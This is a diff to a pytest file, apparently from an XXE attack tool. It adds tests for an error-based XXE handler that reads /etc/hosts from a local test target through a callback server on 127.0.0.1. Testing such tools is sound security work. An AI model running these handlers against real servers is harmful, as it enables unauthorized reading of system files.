@@ -1,8 +1,10 @@
 import pytest
 from pytest_httpserver import HTTPServer
 
+from xeely.custom_http.server import HTTPServerParams
 from xeely.custom_xml import XML
 from xeely.xxe.attack.handler.direct import XXEDirectAttackHandler
+from xeely.xxe.attack.handler.error import XXEDErrorAttackHandler
 
 
 @pytest.fixture
@@ -52,3 +54,27 @@ def test_failed_direct_attack_handler(httpserver: HTTPServer, base_xml):
     data = attack_handler.run_attack()
 
     assert len(data) == 0
+
+
+def test_error_attack_handler(httpserver: HTTPServer, base_xml):
+    attack_handler = XXEDErrorAttackHandler(
+        resource="/etc/hosts",
+        xml=base_xml,
+        target_url=TARGET_URL,
+        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
+    )
+    data = attack_handler.run_attack()
+
+    assert "localhost" in data
+
+
+def test_failed_error_attack_handler(httpserver: HTTPServer, base_xml):
+    attack_handler = XXEDErrorAttackHandler(
+        resource="/invalid",
+        xml=base_xml,
+        target_url=TARGET_URL,
+        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
+    )
+    data = attack_handler.run_attack()
+
+    assert data == ""
